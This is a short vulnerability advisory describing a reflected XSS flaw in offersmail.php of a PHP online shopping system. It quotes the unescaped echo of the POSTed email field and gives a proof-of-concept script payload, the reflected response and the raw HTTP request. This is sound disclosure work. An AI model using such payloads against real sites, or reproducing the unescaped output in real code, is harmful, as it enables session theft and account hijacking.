## ONLINE SHOPPING SYSTEM offersmail.php Reflected XSS Vulnerability

### I. Vulnerability Impact

An attacker can inject arbitrary JavaScript into the page, which executes in the victim's browser. This enables session cookie theft, account hijacking, credential phishing, and malicious redirection.

### II. Source Code Analysis

The vulnerability resides in `offersmail.php`, lines 14-18:

```php
if(!preg_match($emailValidation,$email)){
    echo "
        <div class='alert alert-warning'>
            <a href='#' class='close' data-dismiss='alert' aria-label='close'>&times;</a>
            <b>this $email is not valid..!</b>
        </div>
    ";
```

The `$email` variable is taken directly from `$_POST['email']` and output into the HTML body inside a `<b>` tag without any sanitization. When the email format validation fails, the raw input value is reflected back to the page, and the browser parses any injected HTML tags including `<script>`.

### III. Payload

The core injection payload is:

```
<sCrIpT>alert(1)</sCrIpT>
```

Server response:

```html
<div class='alert alert-warning'>
    <a href='#' class='close' data-dismiss='alert' aria-label='close'>&times;</a>
    <b>this <sCrIpT>alert(1)</sCrIpT> is not valid..!</b>
</div>
```

The browser parses `<sCrIpT>alert(1)</sCrIpT>` as a script element and executes the JavaScript.

HTTP request:

```
POST /offersmail.php HTTP/1.1
Host: onlineshop
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

email=<sCrIpT>alert(1)</sCrIpT>
```

### IV. Source Download

https://code-projects.org/online-shopping-system-in-php-with-source-code/



![image-20260627111940208](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20260627111940208.png)